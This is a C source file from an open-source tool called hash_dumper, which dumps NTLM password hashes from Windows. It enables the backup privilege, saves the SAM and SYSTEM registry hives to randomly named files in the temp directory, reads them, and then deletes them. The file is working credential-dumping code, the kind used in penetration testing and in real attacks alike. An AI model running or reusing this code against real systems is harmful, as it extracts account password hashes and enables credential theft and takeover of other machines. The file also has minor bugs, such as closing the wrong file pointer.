/*
	Copyright (C) 2023 Nikita Retr0-code Korneev

	hash_dumper is free software: you can redistribute, modify it
	under the terms of the GNU Affero General Public License version 3.

	You should have received a copy of GNU Affero General Public License
	version 3 along with hash_dumper.
	If not, see <https://www.gnu.org/licenses/agpl-3.0.html>.

----

	This file defines functions for dumping NTLM hashes from SAM and SYSTEM
*/

#include "hash_dump.h"

// Stores files' paths to hives
static char* system_hive_filepath = NULL;
static char* sam_hive_filepath = NULL;


#if defined(_WIN32) || defined(_WIN64)

int resolve_temp_paths()
{
	// Reading path to user temp directory
	char path_for_save[MAX_PATH];
	if (GetEnvironmentVariableA("TEMP", path_for_save, MAX_PATH) == 0)
		return -1;

	// Adding backslash to end of path
	strcat(path_for_save, "\\");

	// Storage for full system file path
	system_hive_filepath = malloc_check(system_hive_filepath, MAX_PATH, -2);

	// Generating random name for saved system hive
	char* random_name = get_random_string(HIVE_NAME_LENGTH);

	// Saving full path with name
	memcpy(system_hive_filepath, path_for_save, MAX_PATH);
	strcat(system_hive_filepath, random_name);
	free(random_name);		// Deleting random string

	// Saving system hive
	if (reg_save_key("SYSTEM", system_hive_filepath))
		return -2;

	// Storage for full sam file path
	sam_hive_filepath = malloc_check(sam_hive_filepath, MAX_PATH, -2);

	// Generating random name for saved sam hive
	random_name = get_random_string(HIVE_NAME_LENGTH);
	memcpy(sam_hive_filepath, path_for_save, MAX_PATH);

	strcat(sam_hive_filepath, random_name);
	free(random_name);

	if (reg_save_key("SAM", sam_hive_filepath))
		return -4;

	return 0;
}

int reg_save_key(const char* key_name, const char* save_to)
{
	HANDLE token_handle = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token_handle) == 0)
	{
		CloseHandle(token_handle);
		return -1;
	}

	// Enabling requered priviles
	if (enable_privilege(token_handle, SE_BACKUP_NAME, TRUE) != 0)
	{
		CloseHandle(token_handle);
		return -1;
	}

	// Opening registry hive
	HKEY hive_handle = NULL;
	if (RegOpenKeyA(HKEY_LOCAL_MACHINE, key_name, &hive_handle) != ERROR_SUCCESS)
		return -2;

	// Saving hive to file
	if (RegSaveKeyA(hive_handle, save_to, NULL) != ERROR_SUCCESS)
		return -3;

	// Cleanup
	RegCloseKey(hive_handle);
	CloseHandle(token_handle);
	return 0;
}

int enable_privilege(HANDLE token_handle, LPCTSTR privilege, BOOL enable)
{
	BOOL is_enabled = FALSE;
	PrivilegeCheck(token_handle, privilege, &is_enabled);
	if (is_enabled)
		return 0;

	TOKEN_PRIVILEGES token_priveleges;
	LUID luid;

	// Getting LUID
	if (LookupPrivilegeValueW(NULL, privilege, &luid) == 0)
		return -1;

	// Setting up token privileges
	token_priveleges.PrivilegeCount = 1;
	token_priveleges.Privileges[0].Luid = luid;

	// Checking enable or disable privileges
	if (enable)
		token_priveleges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		token_priveleges.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.
	if (AdjustTokenPrivileges(token_handle, FALSE, &token_priveleges, sizeof(TOKEN_PRIVILEGES), NULL, NULL) == 0)
		return -2;

	return 0;
}

#else

int resolve_temp_paths()
{
	return 0xFA17;
}

int reg_save_key(const char* key_name, const char* save_to)
{
	return 0xFA17;
}

int enable_privilege(HANDLE token_handle, LPCTSTR privilege, BOOL enable)
{
	return 0xFA17;
}

#endif

void set_paths(const char* sys_hive_path, const char* sam_hive_path)
{
	system_hive_filepath = sys_hive_path;
	sam_hive_filepath = sam_hive_path;
}

int open_hives(FILE** system_hive, FILE** sam_hive)
{
	*system_hive = fopen(system_hive_filepath, "rb");
	if (*system_hive == NULL)
		return -1;

	*sam_hive = fopen(sam_hive_filepath, "rb");
	if (*sam_hive == NULL)
	{
		fclose(system_hive);
		return -2;
	}

	return 0;
}

void close_hives(FILE** system_hive, FILE** sam_hive)
{
	fclose(*system_hive);
	fclose(*sam_hive);

	remove(system_hive_filepath);
	remove(sam_hive_filepath);
	return 0;
}
